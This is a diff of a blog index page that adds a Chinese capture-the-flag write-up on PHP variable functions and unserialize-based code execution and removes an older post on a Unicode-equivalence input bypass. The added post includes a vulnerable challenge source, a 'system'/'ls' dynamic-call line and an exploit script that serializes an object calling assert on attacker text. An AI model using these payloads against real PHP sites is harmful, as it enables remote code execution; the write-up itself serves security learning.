@@ -169,6 +169,98 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-php动态函数及反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/09/php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  	<time datetime="2021-09-08T16:00:00.000Z" itemprop="datePublished">2021-09-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/09/php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        php动态函数及反序列化
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php动态函数及反序列化"><a href="#php动态函数及反序列化" class="headerlink" title="php动态函数及反序列化"></a>php动态函数及反序列化</h1><p>打开页面源码，发现有一个可疑的php文件，然后打开，发现源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="php动态函数"><a href="#php动态函数" class="headerlink" title="php动态函数"></a>php动态函数</h2><p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=system&amp;$b=ls;$a($b);</span><br></pre></td></tr></table></figure>
+<p>而这里也是用了php动态函数的原理，然后我是想构造一个eval()函数的，发现不行，报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Call to undefined function eval() in</span><br></pre></td></tr></table></figure>
+<p>而查了官方文档后可知：eval属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用它，而这种语法构造的还有：echo、print、unset()、isset()、empty()、include、require等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">而system函数又被禁止了，所以我们可以使用assert()函数</span><br><span class="line"></span><br><span class="line">assert()</span><br></pre></td></tr></table></figure>
+<p>作用：检查一个断言是否为false</p>
+<p>注意：在php版本5到php版本7，assert()函数会将字符串当作是php代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以我们可以构造exp</span><br></pre></td></tr></table></figure>
+<?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this->a = "phpinfo()";
+        $this->b = "assert";
+    }
+    public function __destruct(){
+        $a = $this->a;
+        $b = $this->b;
+    }
+}
+$c = new HelloPhp();
+echo serialize($c);
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后get提交就好</span><br><span class="line"></span><br><span class="line">魔术方法</span><br></pre></td></tr></table></figure>
+__contruct()--------------------在类的对象实例化时被调用
+
+__destruct()--------------------在类的对象被销毁之前被调用
+```
+在题目中是在die(0)在退出脚本时调用了__destruct()魔术方法
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-异或加盲注" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -916,72 +1008,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-unicode编码安全问题" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/04/unicode%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="article-date">
-  	<time datetime="2021-09-03T16:00:00.000Z" itemprop="datePublished">2021-09-04</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/04/unicode%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
-        unicode编码安全问题
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="unicode编码安全问题"><a href="#unicode编码安全问题" class="headerlink" title="unicode编码安全问题"></a>unicode编码安全问题</h1><p>当打开页面时，发现是一个购买的网页，然后输入id为1、2或3，然后输入price，发现显示是错误的商品，然后输入id为4，输入price为1337时，回显只能是一个字符</p>
-<p>而后我们再看源码，发现有一个重要的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;!--Ah,really important,seriously. --&gt;</span><br></pre></td></tr></table></figure>
-<p>因此，我们可以想到使用unicode编码中的等价性来绕过只能输入一个字符的限制，所以我们可以在下面的网站搜索大于1337的字符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/</span><br><span class="line"></span><br><span class="line">搜索框输入：thousands</span><br></pre></td></tr></table></figure>
-
-<p>即可查到大于1000或等于1000的字符，然后取出它的utf-8的形式，将/u改为%即可</p>
-<p>unicode设计有许多安全的问题，详细请看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">浅谈Unicode设计安全：https://xz.aliyun.com/t/5402</span><br><span class="line"></span><br><span class="line">unicode等价性浅谈：https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li></ul>
 	</div>
 
       
